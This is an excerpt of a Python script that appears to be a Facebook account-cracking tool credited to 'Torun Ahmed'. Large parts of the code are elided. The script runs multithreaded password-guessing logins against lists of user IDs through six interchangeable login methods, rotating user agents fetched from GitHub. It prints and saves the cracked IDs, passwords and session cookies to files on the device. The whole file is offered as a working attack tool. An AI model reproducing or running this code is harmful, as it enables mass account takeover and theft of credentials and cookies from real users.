#created by Torun Ahmed 
#github= TORUN-XD 
#JAI BD
# fb id https://www.facebook.com/torunahmed1719095ff
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/TORUN-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("xdg-open https://github.com/TORUN-XD")
#app  check 
...
def TORUN():
    ...
    elif torun =='7':os.system("xdg-open https://www.facebook.com/atorun.chaudhary69")
    else:
...
def TORUN1():
	...
	print("[+]==============================================")
	TORUNlovesyou = input("[+] [CHOOSE] :- ")
	if TORUNlovesyou in ['y','Y','1','yes','YES','Yes']:
		TORUN_xd.append('y')
	else:
		TORUN_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	TORUNtop = input("[+] [CHOOSE] :- ")
	if TORUNtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{TORUNfire}')
		...
		for guru in user:
			...
			if TORUNfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif TORUNfire =='2':yaari.submit(p,uid,pwx,tl)
			elif TORUNfire =='3':yaari.submit(x,uid,pwx,tl)
			elif TORUNfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif TORUNfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif TORUNfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in TORUN-OK.txt,TORUN-CP.txt')
...
def TORUN5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if TORUNfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif TORUNfire =='2':manshera.submit(p,uid,pwx,tl)
			elif TORUNfire =='3':manshera.submit(x,uid,pwx,tl)
			elif TORUNfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif TORUNfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif TORUNfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[TORUN-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in TORUN_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/TORUN-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[TORUN-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/TORUN-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/TORUN-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-TORUN] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
